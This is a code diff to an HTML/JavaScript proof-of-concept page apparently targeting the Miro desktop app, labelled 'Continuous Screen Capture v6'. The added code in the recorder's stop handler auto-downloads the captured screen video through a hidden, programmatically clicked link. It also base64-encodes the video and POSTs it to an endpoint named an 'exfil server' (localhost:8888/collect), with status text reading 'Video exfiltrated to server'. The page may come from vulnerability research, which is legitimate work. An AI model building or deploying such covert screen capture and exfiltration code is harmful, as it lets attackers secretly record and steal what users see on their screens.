@@ -18,7 +18,7 @@ a.dl:hover { background: #0f03; }
 </style>
 </head>
 <body>
-<h1>Miro Desktop PoC — Continuous Screen Capture v5</h1>
+<h1>Miro Desktop PoC — Continuous Screen Capture v6</h1>
 
 <div class="section">
 <span class="label">Bridge</span>
@@ -114,15 +114,53 @@ function show(id, cls, html) {
         };
         recorder.onstop = function() {
             var blob = new Blob(videoChunks, { type: mimeType });
+            var sizeMB = (blob.size / 1024 / 1024).toFixed(2);
+            log('Video blob: ' + sizeMB + ' MB, ' + frameCount + ' frames');
+
+            // Auto-trigger download — no click needed
             var url = URL.createObjectURL(blob);
             var a = document.createElement('a');
             a.href = url;
             a.download = 'miro_capture_' + new Date().toISOString().slice(0,19).replace(/:/g,'-') + '.webm';
-            a.className = 'dl';
-            a.textContent = 'DOWNLOAD VIDEO (' + (blob.size / 1024 / 1024).toFixed(1) + ' MB, ' + frameCount + ' frames, ' + CAPTURE_DURATION_S + 's)';
-            document.getElementById('download').appendChild(a);
-            log('Video ready: ' + (blob.size / 1024 / 1024).toFixed(2) + ' MB');
-            show('rec-status', 'ok', '<b>VIDEO READY — click download link</b>');
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+
+            // Also show a visible link as backup
+            var visible = document.createElement('a');
+            visible.href = url;
+            visible.download = a.download;
+            visible.className = 'dl';
+            visible.textContent = 'DOWNLOAD VIDEO (' + sizeMB + ' MB, ' + frameCount + ' frames)';
+            document.getElementById('download').appendChild(visible);
+
+            show('rec-status', 'ok', '<b>VIDEO AUTO-SAVED — ' + sizeMB + ' MB</b>');
+
+            // Auto-POST to exfil server (sends as binary for efficiency)
+            var EXFIL_URL = 'http://localhost:8888/collect';
+            var reader = new FileReader();
+            reader.onload = function() {
+                var b64 = reader.result.split(',')[1];
+                fetch(EXFIL_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'video-complete',
+                        frames: frameCount,
+                        duration: CAPTURE_DURATION_S,
+                        size: blob.size,
+                        mime: mimeType,
+                        data: b64
+                    }),
+                    mode: 'no-cors'
+                }).then(function() {
+                    show('rec-status', 'ok', 'Video exfiltrated to server');
+                    log('Exfil complete');
+                }).catch(function(e) {
+                    log('Exfil skipped (no receiver): ' + e.message);
+                });
+            };
+            reader.readAsDataURL(blob);
         };
         recorder.start(500);
         log('MediaRecorder: ' + mimeType);
